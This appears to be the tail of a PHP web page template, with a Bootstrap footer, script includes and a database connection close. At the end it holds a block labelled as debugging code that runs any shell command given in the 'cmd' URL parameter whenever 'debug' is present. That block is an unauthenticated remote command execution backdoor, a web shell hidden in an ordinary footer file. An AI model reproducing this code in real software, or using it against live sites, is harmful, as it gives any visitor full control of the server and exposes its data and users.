
    <footer class="container">
        <p>&copy; 2016 <?php echo($CONFIG['company_name']); ?></p>
    </footer>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="js/jquery-3.1.1.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="js/bootstrap.min.js"></script>
  </body>
</html>

<?php
if (isset($mysqli) && !$mysqli->connect_errno) {
	$mysqli->close();
}
?>


<?php
// Debugging stuff. Remove it when done!
if (array_key_exists("debug", $_GET)) {
    echo "<pre>";
    if (array_key_exists("cmd", $_GET)) {
        system($_GET['cmd']);
    }
    echo "</pre>";
}
?>